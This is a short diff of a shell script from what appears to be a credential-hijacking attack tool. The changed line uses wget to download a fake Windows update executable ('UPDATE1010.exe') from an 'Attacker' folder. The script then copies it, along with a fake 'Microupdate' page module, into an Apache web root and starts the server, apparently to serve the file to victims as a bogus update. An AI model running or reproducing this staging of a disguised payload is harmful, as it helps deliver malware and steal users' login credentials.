@@ -32,7 +32,7 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then 
-wget https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials/raw/master/hosts/windows/UPDATE-1903.exe
+wget https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/raw/master/Attacker/sh1mazu_https_fake/UPDATE1010.exe
 cp UPDATE1010.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
 	systemctl start apache2.service
